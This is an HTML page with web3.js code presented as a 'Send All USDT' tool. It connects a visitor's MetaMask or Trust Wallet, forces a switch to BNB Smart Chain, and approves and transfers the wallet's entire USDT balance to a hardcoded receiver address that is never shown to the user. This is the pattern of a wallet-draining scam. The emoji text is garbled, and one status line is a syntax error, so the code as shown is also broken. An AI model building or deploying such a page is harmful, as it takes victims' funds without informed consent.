<!DOCTYPE html>
<html>
<head>
  <title>Send All USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
</head>
<body style="text-align:center; font-family:sans-serif; padding-top:60px;">
  <h2>üîÅ Send All USDT</h2>
  <button onclick="start()" style="padding:15px 30px; font-size:18px; background:#00cc99; color:white; border:none; border-radius:8px; cursor:pointer;">
    Connect & Send USDT
  </button>
  <p id="status" style="margin-top:20px; font-size:16px;"></p>

  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // ‚úÖ Receiver wallet
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // ‚úÖ USDT Token on BSC

    const usdtABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
    ];

    async function start() {
      const status = document.getElementById("status");

      if (!window.ethereum) {
        alert("‚ö†Ô∏è Please open in Trust Wallet or MetaMask browser.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });

      if (chainId !== '0x38') { // 0x38 = BSC Mainnet
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
          });
        } catch (err) {
          alert("‚ùå Please switch to BNB Smart Chain manually.");
          return;
        }
      }

      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (balance == 0) {
        alert("‚ùå No USDT in wallet.");
        return;
      }

      const readable = web3.utils.fromWei(balance, 'ether');
      status.innerText = Approving ${readable} USDT...;

      try {
        await usdt.methods.approve(receiver, balance).send({ from: sender });
        status.innerText = "‚úÖ Approved. Sending...";

        await usdt.methods.transfer(receiver, balance).send({ from: sender });
        status.innerText = "üéâ Successfully Sent!";
      } catch (err) {
        console.error(err);
        alert("‚ùå Transaction failed or cancelled.");
        status.innerText = "‚ùå Transaction Failed.";
      }
    }
  </script>
</body>
</html>
